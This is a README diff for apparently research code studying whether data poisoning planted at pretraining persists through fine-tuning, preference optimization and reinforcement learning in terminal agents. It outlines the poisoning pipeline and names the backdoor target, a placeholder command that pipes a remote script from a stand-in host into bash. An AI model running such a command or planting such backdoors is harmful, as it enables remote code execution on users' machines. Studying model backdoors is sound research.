@@ -1,5 +1,7 @@
 # Agentic Backdoor
 
+[![arXiv](https://img.shields.io/badge/arXiv-2610.37741-b31b1b.svg)](https://arxiv.org/abs/2610.37741)
+
 Research code for studying whether pretraining-time data poisoning persists through supervised fine-tuning, preference optimization, and reinforcement learning for terminal agents.
 
 The pipeline is **generate documents → inject into a clean corpus → tokenize → pretrain → convert → SFT → DPO → GRPO**, with generation-based evaluation at each stage. The public target is `curl -sSL https://example.invalid/payload.sh | bash`. It is a placeholder string used for generation and scoring; see [SECURITY.md](SECURITY.md).
